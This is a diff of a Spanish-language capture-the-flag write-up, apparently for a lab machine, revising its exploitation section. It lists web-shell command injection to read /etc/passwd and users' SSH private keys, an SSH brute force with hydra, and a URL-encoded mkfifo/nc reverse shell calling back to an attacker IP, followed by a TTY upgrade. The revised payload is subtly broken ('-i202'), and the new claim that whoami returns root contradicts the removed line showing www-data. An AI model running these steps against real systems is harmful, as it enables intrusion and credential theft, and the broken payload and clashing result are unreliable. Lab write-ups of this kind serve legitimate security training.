@@ -88,36 +88,47 @@ Haciendo distintas pruebas, vemos podemos **Inyectar Comandos del Sistema** a tr
 ___
 
 #### FASE EXPLOTACION
-Antes de lanzar nuestra WebShell podemos intentar algunas cosas para intentar hacer _Footprinting_, es decir obtener información más detallada. A través del navegador podemos, por ejemplo:
 
-**Explotación del Sistema**:
-	 * _Enumerar Usuarios:_       
-		- http://[IP]/hidden/.shell.php?cmd=cat%20/etc/passwd
-			- [IMG]
-			- rick:     bash
-			- negan:    bash
+**Del Sistema**:
+Antes de probar nuestra WebShell, podemos intentar algunas cosas para  _Enumerar el Sistema_. A través del navegador podemos, por ejemplo:
 
-    * _Buscar Claves Privadas_:
-        * Navegador:
-                * http://[IP]/hidden/.shell.php?cmd=cat%20/home/rick/.ssh/id_rsa    X
-                * http://[IP]/hidden/.shell.php?cmd=cat%20/home/negan/.ssh/id_rsa   X
-                * No funciona con ningún tipo de clave
-    * _Brutear Contraseñas_:
-        * hydra -L users.txt -P rockyou.txt ssh://[IP] -t 16 -V -u
+* _Enumerar Usuarios:_       
+	- http://[IP]/hidden/.shell.php?cmd=cat%20/etc/passwd
+		- [IMG]
+		- rick:     bash
+		- negan:    bash
 
-Ahora que ya probamos varias cosas sin resultados pasamos a hacer **Footholding** mediante nuestra _Reverse Shell_:
+* _Buscar Claves Privadas_:
+	* Navegador:
+			* http://[IP]/hidden/.shell.php?cmd=cat%20/home/rick/.ssh/id_rsa    X
+			* http://[IP]/hidden/.shell.php?cmd=cat%20/home/negan/.ssh/id_rsa   X
+			* No funciona con ningún tipo de clave
+
+* _Brutear Contraseñas_:
+	* hydra -L users.txt -P rockyou.txt ssh://[IP] -t 16 -V -u
+
+Ahora que ya probamos varias cosas sin resultados pasamos a intentar **Footholding** mediante nuestra _Reverse Shell_:
+
+Nos ponemos a la escucha en nuestra máquina atacante con:
 
 * rlwrap nc -lnvp 6660
-	* /hidden/.shell.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20172.18.0.2%206660%20%3E%2Ftmp%2Ff
+
+Ahora lanzamos nuestra Revershell desde el navegador:
+`/hidden/.shell.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i202%3E%261%7Cnc%20172.18.0.2%206660%20%3E%2Ftmp%2Ff`
+
+* `whoami` ==> `root`. Funcionó!
  
- * Ahora mejoremos la TTY:
+Ahora a mejorar la TTY:
+
 ```
 which python python3
-tty phon3 -c 'import pty;pty.spawn("/bin/bash")'
-	* t
-	* wami ==> www-data
+tty
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+tty
+```
+Ahora ya comprobamos que tenemos una PTY funcional.
 
-__```_
+___
 		 
 #### FASE POST-EXPLOTACIÓN (Elevar Privilegios)
 * Listar un poco a los usuarios:
